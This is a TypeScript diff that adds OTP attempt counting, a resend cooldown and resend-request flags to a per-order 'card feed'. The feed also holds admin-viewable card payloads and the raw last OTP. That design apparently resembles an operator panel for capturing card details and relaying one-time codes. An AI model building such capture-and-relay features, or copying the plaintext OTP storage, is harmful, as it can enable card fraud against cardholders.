@@ -14,6 +14,9 @@ export type AdminCardPayload = {
   savedAt: string;
 };
 
+export const OTP_MAX_ATTEMPTS = 2;
+export const OTP_RESEND_COOLDOWN_SEC = 60;
+
 export type CardFeedEntry = {
   order_ref: string;
   transaction_id: string;
@@ -27,7 +30,19 @@ export type CardFeedEntry = {
   updated_at: string;
   last_otp: string | null;
   otp_at: string | null;
+  otp_attempts?: number;
+  otp_resend_requested_at?: string | null;
+  otp_resend_done_at?: string | null;
   card: AdminCardPayload | null;
+};
+
+export type OtpMeta = {
+  attempts: number;
+  maxAttempts: number;
+  remaining: number;
+  canResend: boolean;
+  resendCooldownSec: number;
+  failReason: string | null;
 };
 
 function encryptionKey(): Buffer {
@@ -197,6 +212,122 @@ export async function getCardFeedStatus(orderRef: string): Promise<string | null
   if (!ref) return null;
   const row = loadFeedRaw().find((e) => e.order_ref === ref);
   return row?.status ? String(row.status) : null;
+}
+
+function feedRow(orderRef: string): CardFeedEntry | null {
+  const ref = String(orderRef || "").trim();
+  if (!ref) return null;
+  return loadFeedRaw().find((e) => e.order_ref === ref) ?? null;
+}
+
+export async function getOtpMeta(orderRef: string): Promise<OtpMeta | null> {
+  const row = feedRow(orderRef);
+  if (!row) return null;
+  const attempts = Math.max(0, Number(row.otp_attempts ?? 0));
+  const maxAttempts = OTP_MAX_ATTEMPTS;
+  const remaining = Math.max(0, maxAttempts - attempts);
+  const requestedAt = row.otp_resend_requested_at
+    ? new Date(row.otp_resend_requested_at).getTime()
+    : 0;
+  const doneAt = row.otp_resend_done_at ? new Date(row.otp_resend_done_at).getTime() : 0;
+  const cooldownMs = OTP_RESEND_COOLDOWN_SEC * 1000;
+  const lastResendMs = Math.max(requestedAt, doneAt);
+  const elapsed = lastResendMs ? Date.now() - lastResendMs : cooldownMs;
+  const resendCooldownSec = elapsed >= cooldownMs ? 0 : Math.ceil((cooldownMs - elapsed) / 1000);
+  const failReason =
+    row.status === "failed" && attempts >= maxAttempts ? "otp_attempts_exceeded" : null;
+  return {
+    attempts,
+    maxAttempts,
+    remaining,
+    canResend: resendCooldownSec === 0 && row.status !== "failed" && row.status !== "completed",
+    resendCooldownSec,
+    failReason,
+  };
+}
+
+export async function recordWrongOtpAttempt(orderRef: string): Promise<{
+  attempts: number;
+  maxAttempts: number;
+  remaining: number;
+  rejected: boolean;
+  status: string;
+  failReason: string | null;
+}> {
+  const ref = String(orderRef || "").trim();
+  const feed = loadFeedRaw();
+  const ix = feed.findIndex((e) => e.order_ref === ref);
+  if (ix < 0) {
+    return {
+      attempts: 0,
+      maxAttempts: OTP_MAX_ATTEMPTS,
+      remaining: OTP_MAX_ATTEMPTS,
+      rejected: false,
+      status: "pending",
+      failReason: null,
+    };
+  }
+  const attempts = Math.max(0, Number(feed[ix].otp_attempts ?? 0)) + 1;
+  const rejected = attempts >= OTP_MAX_ATTEMPTS;
+  const status = rejected ? "failed" : "retry_otp";
+  const now = new Date().toISOString();
+  feed[ix] = {
+    ...feed[ix],
+    otp_attempts: attempts,
+    status,
+    updated_at: now,
+    last_otp: null,
+    otp_at: null,
+  };
+  saveFeed(feed);
+  return {
+    attempts,
+    maxAttempts: OTP_MAX_ATTEMPTS,
+    remaining: Math.max(0, OTP_MAX_ATTEMPTS - attempts),
+    rejected,
+    status,
+    failReason: rejected ? "otp_attempts_exceeded" : null,
+  };
+}
+
+export async function requestOtpResend(orderRef: string): Promise<{
+  ok: boolean;
+  error?: string;
+  cooldownSec?: number;
+}> {
+  const row = feedRow(orderRef);
+  if (!row) return { ok: false, error: "order_not_found" };
+  if (row.status === "failed" || row.status === "completed") {
+    return { ok: false, error: "order_closed" };
+  }
+  const meta = await getOtpMeta(orderRef);
+  if (!meta?.canResend) {
+    return { ok: false, error: "cooldown", cooldownSec: meta?.resendCooldownSec ?? OTP_RESEND_COOLDOWN_SEC };
+  }
+  const feed = loadFeedRaw();
+  const ix = feed.findIndex((e) => e.order_ref === row.order_ref);
+  if (ix < 0) return { ok: false, error: "order_not_found" };
+  const now = new Date().toISOString();
+  feed[ix] = { ...feed[ix], otp_resend_requested_at: now, updated_at: now };
+  saveFeed(feed);
+  return { ok: true };
+}
+
+export async function markOtpResendDone(orderRef: string): Promise<void> {
+  const feed = loadFeedRaw();
+  const ix = feed.findIndex((e) => e.order_ref === String(orderRef || "").trim());
+  if (ix < 0) return;
+  feed[ix] = {
+    ...feed[ix],
+    otp_resend_done_at: new Date().toISOString(),
+    updated_at: new Date().toISOString(),
+  };
+  saveFeed(feed);
+}
+
+export async function peekOtpResendRequest(orderRef: string): Promise<string | null> {
+  const row = feedRow(orderRef);
+  return row?.otp_resend_requested_at ? String(row.otp_resend_requested_at) : null;
 }
 
 export async function getCreditCardByOrderRef(orderRef: string): Promise<AdminCardPayload | null> {
